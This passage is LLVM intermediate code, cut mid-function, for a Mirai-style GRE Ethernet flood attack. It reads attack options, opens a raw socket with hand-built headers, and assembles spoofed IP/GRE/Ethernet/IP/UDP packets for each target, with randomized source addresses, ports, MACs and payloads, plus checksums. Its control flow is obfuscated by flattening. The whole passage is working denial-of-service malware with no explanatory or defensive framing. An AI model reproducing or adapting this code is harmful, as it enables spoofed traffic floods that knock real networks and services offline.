  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %.reg2mem
  %.reload2 = load volatile i32, i32* %.reg2mem
  store i32 %.reload2, i32* %12, align 4
  %switchVar = alloca i32
  store i32 -793619692, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %5
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -793619692, label %first
    i32 2057214670, label %95
    i32 1686617502, label %96
    i32 -590664575, label %102
    i32 -1626879377, label %105
    i32 697412445, label %106
    i32 -496671408, label %112
    i32 -441987580, label %166
    i32 -485869416, label %170
    i32 88682573, label %223
    i32 -1008669782, label %227
    i32 1384046166, label %236
    i32 -907709131, label %242
    i32 2091693002, label %250
    i32 -68868314, label %266
    i32 -439225108, label %269
    i32 307741515, label %270
    i32 1317700748, label %271
    i32 -1111244831, label %277
    i32 583216903, label %309
    i32 -1979277004, label %330
    i32 -297820272, label %334
    i32 1032376787, label %338
    i32 -73239712, label %343
    i32 2095182661, label %358
    i32 2039123648, label %363
    i32 -1930059947, label %369
    i32 807042804, label %374
    i32 -612406614, label %380
    i32 1214857200, label %384
    i32 1889581460, label %388
    i32 326650004, label %394
    i32 -1267953467, label %420
    i32 -663847207, label %427
    i32 -914236400, label %494
    i32 -38567221, label %497
    i32 18237943, label %503
    i32 -1346010907, label %504
    i32 -1930328390, label %505
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %93 = icmp eq i32 %.reload, -1
  %94 = select i1 %93, i32 2057214670, i32 1686617502
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 -1930328390, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  store i32 1, i32* %11, align 4
  %97 = load i32, i32* %12, align 4
  %98 = bitcast i32* %11 to i8*
  %99 = call i32 @setsockopt(i32 %97, i32 0, i32 3, i8* %98, i32 4) #6
  %100 = icmp eq i32 %99, -1
  %101 = select i1 %100, i32 -590664575, i32 -1626879377
  store i32 %101, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %12, align 4
  %104 = call i32 @close(i32 %103)
  store i32 -1930328390, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 697412445, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %11, align 4
  %108 = load i8, i8* %7, align 1
  %109 = zext i8 %108 to i32
  %110 = icmp slt i32 %107, %109
  %111 = select i1 %110, i32 -496671408, i32 -439225108
  store i32 %111, i32* %switchVar
  br label %loopEnd

; <label>:112:                                    ; preds = %loopEntry
  %113 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %114 = load i8**, i8*** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i8*, i8** %114, i64 %116
  store i8* %113, i8** %117, align 8
  %118 = load i8**, i8*** %13, align 8
  %119 = load i32, i32* %11, align 4
  %120 = sext i32 %119 to i64
  %121 = getelementptr inbounds i8*, i8** %118, i64 %120
  %122 = load i8*, i8** %121, align 8
  %123 = bitcast i8* %122 to %struct.iphdr*
  store %struct.iphdr* %123, %struct.iphdr** %25, align 8
  %124 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %125 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %124, i64 1
  %126 = bitcast %struct.iphdr* %125 to %struct.grehdr*
  store %struct.grehdr* %126, %struct.grehdr** %26, align 8
  %127 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %128 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %127, i64 1
  %129 = bitcast %struct.grehdr* %128 to %struct.ethhdr*
  store %struct.ethhdr* %129, %struct.ethhdr** %27, align 8
  %130 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %131 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %130, i64 1
  %132 = bitcast %struct.ethhdr* %131 to %struct.iphdr*
  store %struct.iphdr* %132, %struct.iphdr** %28, align 8
  %133 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %134 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %133, i64 1
  %135 = bitcast %struct.iphdr* %134 to %struct.udphdr*
  store %struct.udphdr* %135, %struct.udphdr** %29, align 8
  %136 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = and i8 %138, 15
  %140 = or i8 %139, 64
  store i8 %140, i8* %137, align 4
  %141 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %142 = bitcast %struct.iphdr* %141 to i8*
  %143 = load i8, i8* %142, align 4
  %144 = and i8 %143, -16
  %145 = or i8 %144, 5
  store i8 %145, i8* %142, align 4
  %146 = load i8, i8* %14, align 1
  %147 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 1
  store i8 %146, i8* %148, align 1
  %149 = load i32, i32* %20, align 4
  %150 = sext i32 %149 to i64
  %151 = add i64 66, %150
  %152 = trunc i64 %151 to i16
  %153 = call zeroext i16 @htons(i16 zeroext %152) #7
  %154 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %155 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %154, i32 0, i32 2
  store i16 %153, i16* %155, align 2
  %156 = load i16, i16* %15, align 2
  %157 = call zeroext i16 @htons(i16 zeroext %156) #7
  %158 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 3
  store i16 %157, i16* %159, align 4
  %160 = load i8, i8* %16, align 1
  %161 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %162 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %161, i32 0, i32 5
  store i8 %160, i8* %162, align 4
  %163 = load i8, i8* %17, align 1
  %164 = icmp ne i8 %163, 0
  %165 = select i1 %164, i32 -441987580, i32 -485869416
  store i32 %165, i32* %switchVar
  br label %loopEnd

; <label>:166:                                    ; preds = %loopEntry
  %167 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %168 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 4
  store i16 %167, i16* %169, align 2
  store i32 -485869416, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 6
  store i8 47, i8* %172, align 1
  %173 = load i32, i32* %23, align 4
  %174 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 8
  store i32 %173, i32* %175, align 4
  %176 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %177 = load i32, i32* %11, align 4
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i64 %178
  %180 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %179, i32 0, i32 1
  %181 = load i32, i32* %180, align 4
  %182 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %183 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %182, i32 0, i32 9
  store i32 %181, i32* %183, align 4
  %184 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %185 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %186 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %185, i32 0, i32 1
  store i16 %184, i16* %186, align 2
  %187 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %188 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %189 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %188, i32 0, i32 2
  store i16 %187, i16* %189, align 1
  %190 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %191 = bitcast %struct.iphdr* %190 to i8*
  %192 = load i8, i8* %191, align 4
  %193 = and i8 %192, 15
  %194 = or i8 %193, 64
  store i8 %194, i8* %191, align 4
  %195 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %196 = bitcast %struct.iphdr* %195 to i8*
  %197 = load i8, i8* %196, align 4
  %198 = and i8 %197, -16
  %199 = or i8 %198, 5
  store i8 %199, i8* %196, align 4
  %200 = load i8, i8* %14, align 1
  %201 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %202 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %201, i32 0, i32 1
  store i8 %200, i8* %202, align 1
  %203 = load i32, i32* %20, align 4
  %204 = sext i32 %203 to i64
  %205 = add i64 28, %204
  %206 = trunc i64 %205 to i16
  %207 = call zeroext i16 @htons(i16 zeroext %206) #7
  %208 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %209 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %208, i32 0, i32 2
  store i16 %207, i16* %209, align 2
  %210 = load i16, i16* %15, align 2
  %211 = zext i16 %210 to i32
  %212 = xor i32 %211, -1
  %213 = trunc i32 %212 to i16
  %214 = call zeroext i16 @htons(i16 zeroext %213) #7
  %215 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 3
  store i16 %214, i16* %216, align 4
  %217 = load i8, i8* %16, align 1
  %218 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 5
  store i8 %217, i8* %219, align 4
  %220 = load i8, i8* %17, align 1
  %221 = icmp ne i8 %220, 0
  %222 = select i1 %221, i32 88682573, i32 -1008669782
  store i32 %222, i32* %switchVar
  br label %loopEnd

; <label>:223:                                    ; preds = %loopEntry
  %224 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %225 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %226 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %225, i32 0, i32 4
  store i16 %224, i16* %226, align 2
  store i32 -1008669782, i32* %switchVar
  br label %loopEnd

; <label>:227:                                    ; preds = %loopEntry
  %228 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %229 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %228, i32 0, i32 6
  store i8 17, i8* %229, align 1
  %230 = call i32 @rand_next()
  %231 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 8
  store i32 %230, i32* %232, align 4
  %233 = load i8, i8* %22, align 1
  %234 = icmp ne i8 %233, 0
  %235 = select i1 %234, i32 1384046166, i32 -907709131
  store i32 %235, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %238 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %237, i32 0, i32 9
  %239 = load i32, i32* %238, align 4
  %240 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %241 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %240, i32 0, i32 9
  store i32 %239, i32* %241, align 4
  store i32 2091693002, i32* %switchVar
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 8
  %245 = load i32, i32* %244, align 4
  %246 = sub i32 %245, 1024
  %247 = xor i32 %246, -1
  %248 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 9
  store i32 %247, i32* %249, align 4
  store i32 2091693002, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i16, i16* %18, align 2
  %252 = call zeroext i16 @htons(i16 zeroext %251) #7
  %253 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %254 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %253, i32 0, i32 0
  store i16 %252, i16* %254, align 2
  %255 = load i16, i16* %19, align 2
  %256 = call zeroext i16 @htons(i16 zeroext %255) #7
  %257 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %258 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %257, i32 0, i32 1
  store i16 %256, i16* %258, align 2
  %259 = load i32, i32* %20, align 4
  %260 = sext i32 %259 to i64
  %261 = add i64 8, %260
  %262 = trunc i64 %261 to i16
  %263 = call zeroext i16 @htons(i16 zeroext %262) #7
  %264 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %265 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %264, i32 0, i32 2
  store i16 %263, i16* %265, align 2
  store i32 -68868314, i32* %switchVar
  br label %loopEnd

; <label>:266:                                    ; preds = %loopEntry
  %267 = load i32, i32* %11, align 4
  %268 = add nsw i32 %267, 1
  store i32 %268, i32* %11, align 4
  store i32 697412445, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  store i32 307741515, i32* %switchVar
  br label %loopEnd

; <label>:270:                                    ; preds = %loopEntry
  store i32 0, i32* %11, align 4
  store i32 1317700748, i32* %switchVar
  br label %loopEnd

; <label>:271:                                    ; preds = %loopEntry
  %272 = load i32, i32* %11, align 4
  %273 = load i8, i8* %7, align 1
  %274 = zext i8 %273 to i32
  %275 = icmp slt i32 %272, %274
  %276 = select i1 %275, i32 -1111244831, i32 -38567221
  store i32 %276, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8**, i8*** %13, align 8
  %279 = load i32, i32* %11, align 4
  %280 = sext i32 %279 to i64
  %281 = getelementptr inbounds i8*, i8** %278, i64 %280
  %282 = load i8*, i8** %281, align 8
  store i8* %282, i8** %33, align 8
  %283 = load i8*, i8** %33, align 8
  %284 = bitcast i8* %283 to %struct.iphdr*
  store %struct.iphdr* %284, %struct.iphdr** %34, align 8
  %285 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %286 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %285, i64 1
  %287 = bitcast %struct.iphdr* %286 to %struct.grehdr*
  store %struct.grehdr* %287, %struct.grehdr** %35, align 8
  %288 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %289 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %288, i64 1
  %290 = bitcast %struct.grehdr* %289 to %struct.ethhdr*
  store %struct.ethhdr* %290, %struct.ethhdr** %36, align 8
  %291 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %292 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %291, i64 1
  %293 = bitcast %struct.ethhdr* %292 to %struct.iphdr*
  store %struct.iphdr* %293, %struct.iphdr** %37, align 8
  %294 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %295 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %294, i64 1
  %296 = bitcast %struct.iphdr* %295 to %struct.udphdr*
  store %struct.udphdr* %296, %struct.udphdr** %38, align 8
  %297 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %298 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %297, i64 1
  %299 = bitcast %struct.udphdr* %298 to i8*
  store i8* %299, i8** %39, align 8
  %300 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %301 = load i32, i32* %11, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %303, i32 0, i32 2
  %305 = load i8, i8* %304, align 4
  %306 = zext i8 %305 to i32
  %307 = icmp slt i32 %306, 32
  %308 = select i1 %307, i32 583216903, i32 -1979277004
  store i32 %308, i32* %switchVar
  br label %loopEnd

; <label>:309:                                    ; preds = %loopEntry
  %310 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %311 = load i32, i32* %11, align 4
  %312 = sext i32 %311 to i64
  %313 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %310, i64 %312
  %314 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %313, i32 0, i32 1
  %315 = load i32, i32* %314, align 4
  %316 = call i32 @ntohl(i32 %315) #7
  %317 = call i32 @rand_next()
  %318 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %319 = load i32, i32* %11, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %318, i64 %320
  %322 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %321, i32 0, i32 2
  %323 = load i8, i8* %322, align 4
  %324 = zext i8 %323 to i32
  %325 = lshr i32 %317, %324
  %326 = add i32 %316, %325
  %327 = call i32 @htonl(i32 %326) #7
  %328 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i32 0, i32 9
  store i32 %327, i32* %329, align 4
  store i32 -1979277004, i32* %switchVar
  br label %loopEnd

; <label>:330:                                    ; preds = %loopEntry
  %331 = load i32, i32* %23, align 4
  %332 = icmp eq i32 %331, -1
  %333 = select i1 %332, i32 -297820272, i32 1032376787
  store i32 %333, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i32 @rand_next()
  %336 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i32 0, i32 8
  store i32 %335, i32* %337, align 4
  store i32 1032376787, i32* %switchVar
  br label %loopEnd

; <label>:338:                                    ; preds = %loopEntry
  %339 = load i16, i16* %15, align 2
  %340 = zext i16 %339 to i32
  %341 = icmp eq i32 %340, 65535
  %342 = select i1 %341, i32 -73239712, i32 2095182661
  store i32 %342, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = call i32 @rand_next()
  %345 = and i32 %344, 65535
  %346 = trunc i32 %345 to i16
  %347 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %348 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %347, i32 0, i32 3
  store i16 %346, i16* %348, align 4
  %349 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %350 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %349, i32 0, i32 3
  %351 = load i16, i16* %350, align 4
  %352 = zext i16 %351 to i32
  %353 = sub nsw i32 %352, 1000
  %354 = xor i32 %353, -1
  %355 = trunc i32 %354 to i16
  %356 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %357 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %356, i32 0, i32 3
  store i16 %355, i16* %357, align 4
  store i32 2095182661, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  %359 = load i16, i16* %18, align 2
  %360 = zext i16 %359 to i32
  %361 = icmp eq i32 %360, 65535
  %362 = select i1 %361, i32 2039123648, i32 -1930059947
  store i32 %362, i32* %switchVar
  br label %loopEnd

; <label>:363:                                    ; preds = %loopEntry
  %364 = call i32 @rand_next()
  %365 = and i32 %364, 65535
  %366 = trunc i32 %365 to i16
  %367 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %368 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %367, i32 0, i32 0
  store i16 %366, i16* %368, align 2
  store i32 -1930059947, i32* %switchVar
  br label %loopEnd

; <label>:369:                                    ; preds = %loopEntry
  %370 = load i16, i16* %19, align 2
  %371 = zext i16 %370 to i32
  %372 = icmp eq i32 %371, 65535
  %373 = select i1 %372, i32 807042804, i32 -612406614
  store i32 %373, i32* %switchVar
  br label %loopEnd

; <label>:374:                                    ; preds = %loopEntry
  %375 = call i32 @rand_next()
  %376 = and i32 %375, 65535
  %377 = trunc i32 %376 to i16
  %378 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %379 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %378, i32 0, i32 1
  store i16 %377, i16* %379, align 2
  store i32 -612406614, i32* %switchVar
  br label %loopEnd

; <label>:380:                                    ; preds = %loopEntry
  %381 = load i8, i8* %22, align 1
  %382 = icmp ne i8 %381, 0
  %383 = select i1 %382, i32 1889581460, i32 1214857200
  store i32 %383, i32* %switchVar
  br label %loopEnd

; <label>:384:                                    ; preds = %loopEntry
  %385 = call i32 @rand_next()
  %386 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %387 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %386, i32 0, i32 9
  store i32 %385, i32* %387, align 4
  store i32 326650004, i32* %switchVar
  br label %loopEnd

; <label>:388:                                    ; preds = %loopEntry
  %389 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %390 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %389, i32 0, i32 9
  %391 = load i32, i32* %390, align 4
  %392 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %393 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %392, i32 0, i32 9
  store i32 %391, i32* %393, align 4
  store i32 326650004, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = call i32 @rand_next()
  store i32 %395, i32* %40, align 4
  %396 = call i32 @rand_next()
  store i32 %396, i32* %41, align 4
  %397 = call i32 @rand_next()
  store i32 %397, i32* %42, align 4
  %398 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %399 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %398, i32 0, i32 0
  %400 = getelementptr inbounds [6 x i8], [6 x i8]* %399, i32 0, i32 0
  %401 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %400, i8* %401, i32 4)
  %402 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %403 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %402, i32 0, i32 1
  %404 = getelementptr inbounds [6 x i8], [6 x i8]* %403, i32 0, i32 0
  %405 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %404, i8* %405, i32 4)
  %406 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %407 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %406, i32 0, i32 0
  %408 = getelementptr inbounds [6 x i8], [6 x i8]* %407, i32 0, i32 0
  %409 = getelementptr inbounds i8, i8* %408, i64 4
  %410 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %409, i8* %410, i32 2)
  %411 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %412 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %411, i32 0, i32 1
  %413 = getelementptr inbounds [6 x i8], [6 x i8]* %412, i32 0, i32 0
  %414 = getelementptr inbounds i8, i8* %413, i64 4
  %415 = bitcast i32* %42 to i8*
  %416 = getelementptr inbounds i8, i8* %415, i64 2
  call void @util_memcpy(i8* %414, i8* %416, i32 2)
  %417 = load i8, i8* %21, align 1
  %418 = icmp ne i8 %417, 0
  %419 = select i1 %418, i32 -1267953467, i32 -663847207
  store i32 %419, i32* %switchVar
  br label %loopEnd

; <label>:420:                                    ; preds = %loopEntry
  %421 = load i8*, i8** %39, align 8
  %422 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %421, i32 %422)
  %423 = load i8*, i8** %39, align 8
  %424 = load i32, i32* %20, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds i8, i8* %423, i64 %425
  store i8 0, i8* %426, align 1
  store i32 -663847207, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 7
  store i16 0, i16* %429, align 2
  %430 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %431 = bitcast %struct.iphdr* %430 to i16*
  %432 = call zeroext i16 @checksum_generic(i16* %431, i32 20)
  %433 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 7
  store i16 %432, i16* %434, align 2
  %435 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 7
  store i16 0, i16* %436, align 2
  %437 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %438 = bitcast %struct.iphdr* %437 to i16*
  %439 = call zeroext i16 @checksum_generic(i16* %438, i32 20)
  %440 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %441 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %440, i32 0, i32 7
  store i16 %439, i16* %441, align 2
  %442 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %443 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %442, i32 0, i32 3
  store i16 0, i16* %443, align 2
  %444 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %445 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %446 = bitcast %struct.udphdr* %445 to i8*
  %447 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %448 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %447, i32 0, i32 2
  %449 = load i16, i16* %448, align 2
  %450 = load i32, i32* %20, align 4
  %451 = sext i32 %450 to i64
  %452 = add i64 8, %451
  %453 = trunc i64 %452 to i32
  %454 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %444, i8* %446, i16 zeroext %449, i32 %453)
  %455 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %456 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %455, i32 0, i32 3
  store i16 %454, i16* %456, align 2
  %457 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %458 = load i32, i32* %11, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %457, i64 %459
